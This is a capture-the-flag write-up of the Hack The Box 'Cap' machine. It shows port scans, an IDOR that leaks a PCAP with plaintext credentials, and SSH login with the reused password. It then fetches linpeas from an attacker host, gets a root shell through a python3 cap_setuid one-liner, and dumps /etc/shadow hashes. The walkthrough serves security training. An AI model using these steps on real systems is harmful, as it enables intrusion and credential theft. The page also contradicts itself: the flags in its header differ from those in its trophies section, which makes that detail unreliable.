---
created: 24 Aug 2025 19:08
title: Cap
difficulty: Easy
difficult_sort: 1
points: 0
os: Linux
target_ip: 10.10.10.245
platform: Hack The Box
category: Machines
box_status: Retired
creators: InfoSecJack
source_url: https://app.hackthebox.com/machines/Cap
user_flag: eb5664f19ed353f783de12dc9e75647a
root_flag: 219c22cf58856a0e9e27cc298f3b83d2
date_start: 2025-08-24T19:08:00
date_finish: 2025-08-25
completed: true
tags:
  - htb/machines
  - linux
  - IDOR
  - privesc/cap_setuid
  - creds-reuse
---
# Introduction - Cap
>• **Difficulty**: Easy • **Points**: 0 pts
>• **OS**: Linux • **Architecture**: x86_64 • **Kernel**: 5.4.0-80-generic
>*Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.*

![300](<./attachments/Cap - HTB Machine.png>)

> [!tip] TL;DR – Attack Path
>- **Foothold** → IDOR in PCAP download → captured plaintext creds
>- **User** → SSH login with exposed creds
>- **Root** → Abused Linux capabilities (`cap_setuid`) for escalation
## Metadata
| Field               | Value                |
| ------------------- | -------------------- |
| **Target IP**       | 10.10.10.245         |
| **Attack IP**       | 10.10.14.40          |
| **Vulnerabilities** | `IDOR`, `cap_setuid` |
## Tutorial
```cardlink
url: https://www.youtube.com/watch?v=O_z6o2xuvlw
title: "HackTheBox - Cap"
description: "00:00 - Intro00:50 - Start of nmap and doing some recon against FTP02:40 - Having trouble finding a release date, using WGET and examining metadata to see ho..."
host: www.youtube.com
favicon: https://www.youtube.com/s/desktop/271635d3/img/logos/favicon_32x32.png
image: https://i.ytimg.com/vi/O_z6o2xuvlw/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGEkgZSgXMA8=&rs=AOn4CLCQo4OitAMhTgYJbwSvO6Jzi1xz8g
```
- [Cap-HTB-Writeup-pdf](<./attachments/Cap.pdf>)
- [Medium](https://medium.com/@eng.jamaluddin/cap-machine-hack-the-box-25aac74883db)
---
# 1. Environment Setup
> [!abstract] Phase Goal
> Bootstrap the session with directories, variables, and basic configs for consistency across Linux/Windows targets.

```bash
#!/usr/bin/env bash
# setup.sh — HTB session bootstrap (Linux/Windows adaptable)
set -euo pipefail
# User prompts (if not set)
prompt() { [ -z "${!1:-}" ] && read -p "$2: " $1; }
prompt HOST_IP   "Your IP (10.10.14.X)"
prompt TARGET_IP "Target IP"
prompt DOMAIN    "Domain (optional, e.g. for AD)"
prompt OS        "OS (Linux/Windows)"
export HOST_IP TARGET_IP DOMAIN OS
# Create directories
mkdir -p recon screenshots loot exploits payloads
# Save .env
cat > .env <<EOF
HOST_IP=${HOST_IP}
TARGET_IP=${TARGET_IP}
DOMAIN=${DOMAIN}
OS=${OS}
EOF
echo "Environment ready → source .env"
# Optional: VPN check for HTB
ping -c1 "$TARGET_IP" >/dev/null 2>&1 || echo "Warning: Target unreachable — check VPN!"
```

> **Run:** `bash setup.sh && source .env`

---
# 2. Reconnaissance
> [!abstract] Phase Goal
> Identify open ports, services, and potential entry points without exploitation. Adapt scans for OS.

## Scanning Workflow
### Scan All TCP Ports
```bash
# Fast TCP sweep (RustScan for speed)
rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 6500  -- -oN recon/rustscan.txt -oX recon/rustscan.xml

# Extract open ports
grep "^[0-9]" recon/rustscan.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > recon/open_ports.txt
OPEN_PORTS=$(cat recon/open_ports.txt); echo "OPEN_PORTS=$OPEN_PORTS" | tee -a .env
```
### Enumerated Open Ports
```bash
sudo nmap -sC -sV -Pn -vv $TARGET_IP -p $OPEN_PORTS -oA recon/nmap_detailed
```
```sh
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH

80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Open Ports & Services Table
>No significant UDP services identified.
>3 Open ports founded

| Port | State | Service | Version                         | Notes                    |
| ---- | ----- | ------- | ------------------------------- | ------------------------ |
| 21   | open  | ftp     | vsftpd 3.0.3                    | Anonymous login disabled |
| 22   | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 | Possible Foothold        |
| 80   | open  | http    | Gunicorn                        |                          |

---
# 3. Service Enumeration & Vulnerability Scanning
> [!abstract] Phase Goal
> Probe services for misconfigurations, leaks, and vulnerabilities. Use OS-specific tools.
## FTP (Port 21) - vsftpd 3.0.3
### CVE Search
```bash
searchsploit vsftpd 3.0.3
```
![400](<./attachments/Cap-1.png>)
>A Remote Denial of Service (RDDoS) attack is a malicious attempt to make a server, service, or network unavailable by sending a flood of traffic or specially crafted data from a remote location. - **NOT USEFUL TO GAIN ACCESS**

```bash
ftp 10.10.10.245 21
# anonymous:anonymous
```
>Anonymous login disabled
>Anonymous FTP allows users to access public files on a server without needing a personal user ID or password.

![400](<./attachments/Cap - HTB Machine-1.png>)
## HTTP (Port 80) - gunicorn
- Port 80 hosts a web server with a dashboard application.
- **Web Server Details**: gunicorn running on Ubuntu.
- **Enumeration**: Used `gobuster` to enumerate directories:
### Tool Inspection
#### 1. Directory brute-force (FFUF)
```bash
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,303 -fc 404,403 -t 150 -o recon/ffuf-root.json -of json
```
```sh
data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 413ms]
ip                      [Status: 200, Size: 17459, Words: 7275, Lines: 355, Duration: 407ms]
capture                 [Status: 302, Size: 222, Words: 21, Lines: 4, Duration: 5465ms] # redirect to `data`
```
### Browser Inspection
#### Homepage
> http://10.10.10.245:80
> Home/Dashboard
> Access to user: `Nathan`

![400](<./attachments/Cap - HTB Machine-5.png>)
#### 404 Error Page
>http://10.10.10.245/404
>[Flask](https://flask.palletsprojects.com/en/3.0.x/) is a Python web framework.

![404](<./attachments/Cap - HTB Machine-6.png>)
- View [LINK](https://0xdf.gitlab.io/cheatsheets/404#flask) for more info
#### IP Config section
> http://10.10.10.245/ip

![400](<./attachments/Cap - HTB Machine-7.png>)
#### Network Status Section 
>http://10.10.10.245/netstat

![400](<./attachments/Cap - HTB Machine-8.png>)
#### Security Snapshot Section
>http://10.10.10.245/data/2
>click on **Security Snapshot (5 Second PCAP + Analysis)** give a download file option
- under security snapshots the `data/id` can be change
- change `data/2` to `data/0`
![400](<./attachments/Cap-2.png>)
>http://10.10.10.245/data/0

![400](<./attachments/Cap-3.png>)
- Download the `o.pcap` and analyze with `wireshark/tcpdump`
### Key Discoveries
- Discovered `/data/` directory, which allowed access to files via an [[IDOR(Insecure Direct Object Reference)]] vulnerability.
- URL: `http://10.10.10.245/data/0` displayed a network packet capture (PCAP) file.
- Iterated through IDs (e.g., `/data/1`, `/data/2`) and found sensitive files, including user credentials in a downloadable file.
## Vulnerability Table
| Vulnerability | Severity | Proof                        |
| ------------- | -------- | ---------------------------- |
| IDOR          | High     | `http://10.10.10.245/data/0` |

---
# 4. Initial Access (Foothold)
> [!abstract] Phase Goal
> First stage of a cyberattack where attackers gain entry into a target's network or System.Text.ASCIIEncoding

> [!success] **Vector:** IDOR → `data/0` file download → `wireshark` view → plain test leaked reuseable password `ssh/ftp` 

## File Download Vulnerability

- The web application allowed unauthenticated access to sensitive files via the `/data/` endpoint.
- Used the extracted credentials (`nathan:Buck3tH4TF0RM3!`) to attempt login via SSH on port 22.
### **Credentials Discovery**:
  - Downloaded a file from `/data/0` using `curl`:
```bash
curl http://10.10.10.245/data/0 -o data_0.pcap
```
  
  - Analyzed the PCAP file using **Wireshark**
```sh title:wireshark
wireshark 0.pcap
```

> filter via protocol, right-click select `follow/tcp stream> `
![400](<./attachments/Cap-5.png>)
>[!IMPORTANT]
>nathan:Buck3tH4TF0RM3!
- Reuseable Password 
- can be used to ftp and ssh into user `nathan`
```bash
ssh nathan@10.10.10.245 -p 22 # Buck3tH4TF0RM3!
```

---
# 5. Lateral Movement - None
> [!abstract] Phase Goal
> Enumerate internally, pivot to non-root/system user. Use OS-specific techniques.

---
# 6. Privilege Escalation → `root`
> [!abstract] Phase Goal
> Escalate to highest privileges using OS-specific vectors.

>nathan:Buck3tH4TF0RM3!
```bash
ssh nathan@10.10.10.245 -p 22 # Buck3tH4TF0RM3!
```
> view current directory
## Internal Enumeration
### Steps
```bash
# HOST machine -- Create python server for tool share on --- To Send data
cd tools
python3 -m http.server 8000
# TARGET Machine -- Recieve data
cd $(mktemp -d)
mkdir loot
wget http://$HOST_IP:8000/linpeas.sh && wget http://$HOST_IP:8000/pspy64
# To Send LOOT From TARGET to HOST, Recreate python server but on target in `loot` directory
cd loot
 wget -r http://10.10.10.245:8000
```

```bash
# Automated (LinPEAS)
bash linpeas.sh | tee loot/linpeas.txt
# Manual
uname -a > loot/info.txt; id >> loot/info.txt; ifconfig -a >> loot/info.txt
sudo -l > loot/sudo-l.txt
find / -perm -u=s -type f 2>/dev/null > loot/suid.txt
crontab -l > loot/crontab.txt
pspy64 > loot/pspy.log & # Run for 5-10 min
```

**Output**:
  - User: `nathan` ; user flag locate in `/home/nathan/user.txt`
  - No `sudo` privileges.
  - Checked for unusual capabilities

![00](<./attachments/Cap-6.png>)
## Privilege Escalation Vector
> [!success] **Vector:**  `/usr/bin/python3` had the `cap_setuid+ep` capability, allowing it to set the user ID to any user (including root).

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- This spawned a root shell, granting full administrative access.
![00](<./attachments/Cap - HTB Machine-9.png>)
---
# 7. Post-Exploitation & Cleanup
> [!abstract] Phase Goal
> Extract sensitive data, persist if needed, then clean up.

> [!warning] Cleanup Commands
> - Reset scripts/services
> - Kill processes: `killall nc pspy64` (Linux)
> - Submit flags, retire box.
```bash
killall nc pspy64
# Reset modified files
```
---
# Trophies & Proofs
## Trophies of flags

### User Flag
```txt
f63e490a8a3fd6f7032ac8e7f0b89e1c
```
![400](<./attachments/Cap - HTB Machine-2.png>)
### Root Flag
```txt
3540f38a944802969e78336b1745a481
```
![400](<./attachments/Cap - HTB Machine-3.png>)
### Additional (e.g., /etc/shadow )
```bash
cat /etc/shadow | grep -F "\$"
```
```txt
root:$6$8vQCitG5q4/cAsI0$Ey/2luHcqUjzLfwBWtArUls9.IlVMjqudyWNOUFUGDgbs9T0RqxH6PYGu/ya6yG0MNfeklSnBLlOskd98Mqdm0:18762:0:99999:7:::
nathan:$6$R9uks4CNctqqxTOR$/PRd4MKFG5NUNxPkdvIedn.WGvkBh9zqcvCRRzgggky1Xcv7ZxTXfny0QmA.gZ/8keiXdblFB7muSeo2igvjk.:18762:0:99999:7:::
```
![400](<./attachments/Cap - HTB Machine-4.png>)
## Proof of Box Pwned
![400](<./attachments/Cap-7.png>)

---
# Guided Mode - Question & Answers
## Task 1
**How many TCP ports are open?**
```txt
3
```
## Task 2
**After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?**
```txt
data
```
## Task 3
**Are you able to get to other users' scans?**
```txt
yes
```
## Task 4
**What is the ID of the PCAP file that contains sensative data?**
```txt
0
```
## Task 5
**Which application layer protocol in the pcap file can the sensetive data be found in?**
```txt
ftp
```
## Task 6
**We've managed to collect nathan's FTP password. On what other service does this password work?**
```txt
ssh
```
## Task 7 - User Flag
**Submit the flag located in the nathan user's home directory.**
```txt
f63e490a8a3fd6f7032ac8e7f0b89e1c
```
## Task 8
**What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**
```txt
/usr/bin/python3.8
```
## Task 9 - Root flag
**Submit the flag located in root's home directory.**
```txt
3540f38a944802969e78336b1745a481
```
---
# Resolution summary
## Attack Path Flowchart
```mermaid
flowchart LR
    A[Recon: Ports & Services] --> B[Enum: HTTP/SSH/FTP]
    B --> C[Foothold: IDOR]
    C --> D[User: creds-reuse ftp/ssh]
    D --> E[Root: cap_setuid]
    E --> F[Post-Ex: Flags & Cleanup]
  classDef tiny fill:stroke-width:1px,font-size:10px;
  class A,B,C,D,E,F tiny;
  style A fill:#f9f,stroke:#333,stroke-width:1px
  style F fill:#bbf,stroke:#333,stroke-width:1px
```

## Improved Skills
- Practicing **Insecure Direct Object Reference(IDOR) exploitation**
- Leveraging **Linux capabilities** for privilege escalation
## Tools Used (Categorized)
**Recon:** `rustscan`, `nmap`
**Enum/Brute:** `ffuf`, `gobuster`,`nuclei`
**Exploit:** `Wireshark`, `python`
**Privesc:** `linpeas`, `pspy64`
**Utils:** `wget`, `nc`
## References & Further Reading
- [GTFOBins](https://gtfobins.github.io/) — Linux Privesc
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/) — General Pentesting
- [IppSec HTB Walkthroughs](https://www.youtube.com/c/ippsec) — Video Guides
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)